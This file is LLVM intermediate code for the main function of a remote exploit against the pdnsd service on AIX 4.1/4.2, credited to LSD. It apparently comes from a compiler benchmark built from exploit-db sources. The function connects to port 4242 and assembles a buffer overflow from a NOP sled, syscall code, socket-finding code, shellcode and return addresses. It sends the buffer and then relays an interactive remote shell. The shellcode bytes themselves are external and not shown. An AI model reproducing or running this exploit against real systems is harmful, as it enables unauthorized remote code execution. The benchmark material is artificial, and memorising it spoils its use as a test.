; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/remote/extr_21093.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/remote/extr_21093.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.netbuf = type { i32, i32, i8* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM oct 1999 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [38 x i8] c"pdnsd for AIX 4.1 4.2 PowerPC/POWER\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"usage: %s address 41|42\0A\00", align 1
@syscallcode = common dso_local global i8** null, align 8
@SCAIX41 = common dso_local global i32 0, align 4
@SCAIX42 = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@EADDRNOTAVAIL = common dso_local global i64 0, align 8
@errno = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@ADRNUM = common dso_local global i32 0, align 4
@NOPNUM = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8** null, align 8
@.str.4 = private unnamed_addr constant [8 x i8] c"sockmod\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"port=%d connected! \00", align 1
@stdout = common dso_local global i32 0, align 4
@findsckcode = common dso_local global i8** null, align 8
@nop = common dso_local global i32* null, align 8
@ALLIGN = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"sent!\0A\00", align 1
@.str.8 = private unnamed_addr constant [15 x i8] c"/bin/uname -a\0A\00", align 1
@FD_SETSIZE = common dso_local global i32 0, align 4
@EWOULDBLOCK = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %struct.sockaddr_in, align 4
  %16 = alloca %struct.netbuf, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0))
  %22 = load i32, i32* %4, align 4
  %23 = icmp ne i32 %22, 3
  br i1 %23, label %24, label %30

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0), i8* %27)
  %29 = call i32 @exit(i32 -1) #3
  unreachable

30:                                               ; preds = %2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33)
  switch i32 %34, label %45 [
    i32 41, label %35
    i32 42, label %40
  ]

35:                                               ; preds = %30
  %36 = load i8**, i8*** @syscallcode, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 32
  %38 = load i32, i32* @SCAIX41, align 4
  %39 = call i32 @memcpy(i8** %37, i32 %38, i32 12)
  br label %47

40:                                               ; preds = %30
  %41 = load i8**, i8*** @syscallcode, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 32
  %43 = load i32, i32* @SCAIX42, align 4
  %44 = call i32 @memcpy(i8** %42, i32 %43, i32 12)
  br label %47

45:                                               ; preds = %30
  %46 = call i32 @exit(i32 -1) #3
  unreachable

47:                                               ; preds = %40, %35
  %48 = load i32, i32* @AF_INET, align 4
  %49 = load i32, i32* @SOCK_STREAM, align 4
  %50 = call i32 @socket(i32 %48, i32 %49, i32 0)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* @AF_INET, align 4
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  store i32 %51, i32* %52, align 4
  %53 = call i32 @htons(i32 4242)
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i32 %53, i32* %54, align 4
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @inet_addr(i8* %57)
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  %60 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %59, i32 0, i32 0
  store i32 %58, i32* %60, align 4
  %61 = icmp eq i32 %58, -1
  br i1 %61, label %62, label %80

62:                                               ; preds = %47
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 1
  %65 = load i8*, i8** %64, align 8
  %66 = call %struct.hostent* @gethostbyname(i8* %65)
  store %struct.hostent* %66, %struct.hostent** %14, align 8
  %67 = icmp eq %struct.hostent* %66, null
  br i1 %67, label %68, label %72

68:                                               ; preds = %62
  %69 = load i64, i64* @EADDRNOTAVAIL, align 8
  store i64 %69, i64* @errno, align 8
  %70 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  %71 = call i32 @exit(i32 -1) #3
  unreachable

72:                                               ; preds = %62
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  %74 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %73, i32 0, i32 0
  %75 = bitcast i32* %74 to i8**
  %76 = load %struct.hostent*, %struct.hostent** %14, align 8
  %77 = getelementptr inbounds %struct.hostent, %struct.hostent* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 4
  %79 = call i32 @memcpy(i8** %75, i32 %78, i32 4)
  br label %80

80:                                               ; preds = %72, %47
  %81 = load i32, i32* %13, align 4
  %82 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %83 = call i64 @connect(i32 %81, %struct.sockaddr* %82, i32 12)
  %84 = icmp slt i64 %83, 0
  br i1 %84, label %85, label %88

85:                                               ; preds = %80
  %86 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  %87 = call i32 @exit(i32 -1) #3
  unreachable

88:                                               ; preds = %80
  %89 = load i32, i32* @ADRNUM, align 4
  %90 = load i32, i32* @NOPNUM, align 4
  %91 = add nsw i32 %89, %90
  %92 = load i8**, i8*** @shellcode, align 8
  %93 = call i32 @strlen(i8** %92)
  %94 = add nsw i32 %91, %93
  store i32 %94, i32* %11, align 4
  %95 = load i32, i32* @NOPNUM, align 4
  %96 = ashr i32 %95, 1
  %97 = add nsw i32 804391176, %96
  %98 = call i64 @htonl(i32 %97)
  %99 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %100 = bitcast i8* %99 to i64*
  store i64 %98, i64* %100, align 1
  store i32 12, i32* %9, align 4
  %101 = load i32, i32* %13, align 4
  %102 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %103 = call i32 @getsockname(i32 %101, %struct.sockaddr* %102, i32* %9)
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %114

105:                                              ; preds = %88
  %106 = load i32, i32* %13, align 4
  %107 = call i32 (i32, i8, ...) @ioctl(i32 %106, i8 signext 2, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %108 = getelementptr inbounds %struct.netbuf, %struct.netbuf* %16, i32 0, i32 0
  store i32 65535, i32* %108, align 8
  %109 = getelementptr inbounds %struct.netbuf, %struct.netbuf* %16, i32 0, i32 1
  store i32 12, i32* %109, align 4
  %110 = bitcast %struct.sockaddr_in* %15 to i8*
  %111 = getelementptr inbounds %struct.netbuf, %struct.netbuf* %16, i32 0, i32 2
  store i8* %110, i8** %111, align 8
  %112 = load i32, i32* %13, align 4
  %113 = call i32 (i32, i8, ...) @ioctl(i32 %112, i8 signext -112, %struct.netbuf* %16)
  br label %114

114:                                              ; preds = %105, %88
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @ntohs(i32 %116)
  store i32 %117, i32* %10, align 4
  %118 = load i32, i32* %10, align 4
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i32 %118)
  %120 = load i32, i32* @stdout, align 4
  %121 = call i32 @fflush(i32 %120)
  %122 = load i32, i32* %10, align 4
  %123 = and i32 %122, 65280
  %124 = ashr i32 %123, 8
  %125 = trunc i32 %124 to i8
  %126 = zext i8 %125 to i64
  %127 = inttoptr i64 %126 to i8*
  %128 = load i8**, i8*** @findsckcode, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 2
  store i8* %127, i8** %129, align 8
  %130 = load i32, i32* %10, align 4
  %131 = and i32 %130, 255
  %132 = trunc i32 %131 to i8
  %133 = zext i8 %132 to i64
  %134 = inttoptr i64 %133 to i8*
  %135 = load i8**, i8*** @findsckcode, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 3
  store i8* %134, i8** %136, align 8
  %137 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  store i8* %137, i8** %8, align 8
  %138 = load i32, i32* %11, align 4
  %139 = call i64 @htonl(i32 %138)
  %140 = load i8*, i8** %8, align 8
  %141 = bitcast i8* %140 to i64*
  store i64 %139, i64* %141, align 8
  %142 = load i8*, i8** %8, align 8
  %143 = getelementptr inbounds i8, i8* %142, i64 4
  store i8* %143, i8** %8, align 8
  store i32 0, i32* %9, align 4
  br label %144

144:                                              ; preds = %158, %114
  %145 = load i32, i32* %9, align 4
  %146 = load i32, i32* @NOPNUM, align 4
  %147 = icmp slt i32 %145, %146
  br i1 %147, label %148, label %161

148:                                              ; preds = %144
  %149 = load i32*, i32** @nop, align 8
  %150 = load i32, i32* %9, align 4
  %151 = srem i32 %150, 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i32, i32* %149, i64 %152
  %154 = load i32, i32* %153, align 4
  %155 = trunc i32 %154 to i8
  %156 = load i8*, i8** %8, align 8
  %157 = getelementptr inbounds i8, i8* %156, i32 1
  store i8* %157, i8** %8, align 8
  store i8 %155, i8* %156, align 1
  br label %158

158:                                              ; preds = %148
  %159 = load i32, i32* %9, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %9, align 4
  br label %144

161:                                              ; preds = %144
  store i32 0, i32* %9, align 4
  br label %162

162:                                              ; preds = %176, %161
  %163 = load i32, i32* %9, align 4
  %164 = load i8**, i8*** @syscallcode, align 8
  %165 = call i32 @strlen(i8** %164)
  %166 = icmp slt i32 %163, %165
  br i1 %166, label %167, label %179

167:                                              ; preds = %162
  %168 = load i8**, i8*** @syscallcode, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8*, i8** %168, i64 %170
  %172 = load i8*, i8** %171, align 8
  %173 = ptrtoint i8* %172 to i8
  %174 = load i8*, i8** %8, align 8
  %175 = getelementptr inbounds i8, i8* %174, i32 1
  store i8* %175, i8** %8, align 8
  store i8 %173, i8* %174, align 1
  br label %176

176:                                              ; preds = %167
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %9, align 4
  br label %162

179:                                              ; preds = %162
  store i32 0, i32* %9, align 4
  br label %180

180:                                              ; preds = %194, %179
  %181 = load i32, i32* %9, align 4
  %182 = load i8**, i8*** @findsckcode, align 8
  %183 = call i32 @strlen(i8** %182)
  %184 = icmp slt i32 %181, %183
  br i1 %184, label %185, label %197

185:                                              ; preds = %180
  %186 = load i8**, i8*** @findsckcode, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8*, i8** %186, i64 %188
  %190 = load i8*, i8** %189, align 8
  %191 = ptrtoint i8* %190 to i8
  %192 = load i8*, i8** %8, align 8
  %193 = getelementptr inbounds i8, i8* %192, i32 1
  store i8* %193, i8** %8, align 8
  store i8 %191, i8* %192, align 1
  br label %194

194:                                              ; preds = %185
  %195 = load i32, i32* %9, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %9, align 4
  br label %180

197:                                              ; preds = %180
  store i32 0, i32* %9, align 4
  br label %198

198:                                              ; preds = %212, %197
  %199 = load i32, i32* %9, align 4
  %200 = load i8**, i8*** @shellcode, align 8
  %201 = call i32 @strlen(i8** %200)
  %202 = icmp slt i32 %199, %201
  br i1 %202, label %203, label %215

203:                                              ; preds = %198
  %204 = load i8**, i8*** @shellcode, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i8*, i8** %204, i64 %206
  %208 = load i8*, i8** %207, align 8
  %209 = ptrtoint i8* %208 to i8
  %210 = load i8*, i8** %8, align 8
  %211 = getelementptr inbounds i8, i8* %210, i32 1
  store i8* %211, i8** %8, align 8
  store i8 %209, i8* %210, align 1
  br label %212

212:                                              ; preds = %203
  %213 = load i32, i32* %9, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %9, align 4
  br label %198

215:                                              ; preds = %198
  store i32 0, i32* %9, align 4
  br label %216

216:                                              ; preds = %228, %215
  %217 = load i32, i32* %9, align 4
  %218 = load i32, i32* @ALLIGN, align 4
  %219 = icmp slt i32 %217, %218
  br i1 %219, label %220, label %231

220:                                              ; preds = %216
  %221 = load i32, i32* %9, align 4
  %222 = srem i32 %221, 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %223
  %225 = load i8, i8* %224, align 1
  %226 = load i8*, i8** %8, align 8
  %227 = getelementptr inbounds i8, i8* %226, i32 1
  store i8* %227, i8** %8, align 8
  store i8 %225, i8* %226, align 1
  br label %228

228:                                              ; preds = %220
  %229 = load i32, i32* %9, align 4
  %230 = add nsw i32 %229, 1
  store i32 %230, i32* %9, align 4
  br label %216

231:                                              ; preds = %216
  store i32 0, i32* %9, align 4
  br label %232

232:                                              ; preds = %244, %231
  %233 = load i32, i32* %9, align 4
  %234 = load i32, i32* @ADRNUM, align 4
  %235 = icmp slt i32 %233, %234
  br i1 %235, label %236, label %247

236:                                              ; preds = %232
  %237 = load i32, i32* %9, align 4
  %238 = srem i32 %237, 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %239
  %241 = load i8, i8* %240, align 1
  %242 = load i8*, i8** %8, align 8
  %243 = getelementptr inbounds i8, i8* %242, i32 1
  store i8* %243, i8** %8, align 8
  store i8 %241, i8* %242, align 1
  br label %244

244:                                              ; preds = %236
  %245 = load i32, i32* %9, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %9, align 4
  br label %232

247:                                              ; preds = %232
  %248 = load i8*, i8** %8, align 8
  store i8 0, i8* %248, align 1
  %249 = load i32, i32* %13, align 4
  %250 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %251 = load i32, i32* %11, align 4
  %252 = add nsw i32 4, %251
  %253 = sub nsw i32 %252, 1
  %254 = call i32 @write(i32 %249, i8* %250, i32 %253)
  %255 = call i32 @sleep(i32 3)
  %256 = load i32, i32* %13, align 4
  %257 = call i32 @send(i32 %256, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0), i32 1, i32 0)
  %258 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %259 = load i32, i32* %13, align 4
  %260 = call i32 @write(i32 %259, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0), i32 14)
  br label %261

261:                                              ; preds = %247, %284, %308, %315
  %262 = call i32 @FD_ZERO(i32* %17)
  %263 = call i32 @FD_SET(i32 0, i32* %17)
  %264 = load i32, i32* %13, align 4
  %265 = call i32 @FD_SET(i32 %264, i32* %17)
  %266 = load i32, i32* @FD_SETSIZE, align 4
  %267 = call i64 @select(i32 %266, i32* %17, i32* null, i32* null, i32* null)
  %268 = icmp ne i64 %267, 0
  br i1 %268, label %269, label %315

269:                                              ; preds = %261
  %270 = call i64 @FD_ISSET(i32 0, i32* %17)
  %271 = icmp ne i64 %270, 0
  br i1 %271, label %272, label %291

272:                                              ; preds = %269
  %273 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %274 = call i32 @read(i32 0, i8* %273, i32 1024)
  store i32 %274, i32* %18, align 4
  %275 = icmp slt i32 %274, 1
  br i1 %275, label %276, label %286

276:                                              ; preds = %272
  %277 = load i64, i64* @errno, align 8
  %278 = load i64, i64* @EWOULDBLOCK, align 8
  %279 = icmp eq i64 %277, %278
  br i1 %279, label %284, label %280

280:                                              ; preds = %276
  %281 = load i64, i64* @errno, align 8
  %282 = load i64, i64* @EAGAIN, align 8
  %283 = icmp eq i64 %281, %282
  br i1 %283, label %284, label %285

284:                                              ; preds = %280, %276
  br label %261

285:                                              ; preds = %280
  br label %316

286:                                              ; preds = %272
  %287 = load i32, i32* %13, align 4
  %288 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %289 = load i32, i32* %18, align 4
  %290 = call i32 @write(i32 %287, i8* %288, i32 %289)
  br label %291

291:                                              ; preds = %286, %269
  %292 = load i32, i32* %13, align 4
  %293 = call i64 @FD_ISSET(i32 %292, i32* %17)
  %294 = icmp ne i64 %293, 0
  br i1 %294, label %295, label %314

295:                                              ; preds = %291
  %296 = load i32, i32* %13, align 4
  %297 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %298 = call i32 @read(i32 %296, i8* %297, i32 1024)
  store i32 %298, i32* %18, align 4
  %299 = icmp slt i32 %298, 1
  br i1 %299, label %300, label %310

300:                                              ; preds = %295
  %301 = load i64, i64* @errno, align 8
  %302 = load i64, i64* @EWOULDBLOCK, align 8
  %303 = icmp eq i64 %301, %302
  br i1 %303, label %308, label %304

304:                                              ; preds = %300
  %305 = load i64, i64* @errno, align 8
  %306 = load i64, i64* @EAGAIN, align 8
  %307 = icmp eq i64 %305, %306
  br i1 %307, label %308, label %309

308:                                              ; preds = %304, %300
  br label %261

309:                                              ; preds = %304
  br label %316

310:                                              ; preds = %295
  %311 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %312 = load i32, i32* %18, align 4
  %313 = call i32 @write(i32 1, i8* %311, i32 %312)
  br label %314

314:                                              ; preds = %310, %291
  br label %315

315:                                              ; preds = %314, %261
  br label %261

316:                                              ; preds = %309, %285
  %317 = load i32, i32* %3, align 4
  ret i32 %317
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memcpy(i8**, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @strlen(i8**) #1

declare dso_local i64 @htonl(i32) #1

declare dso_local i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @ioctl(i32, i8 signext, ...) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
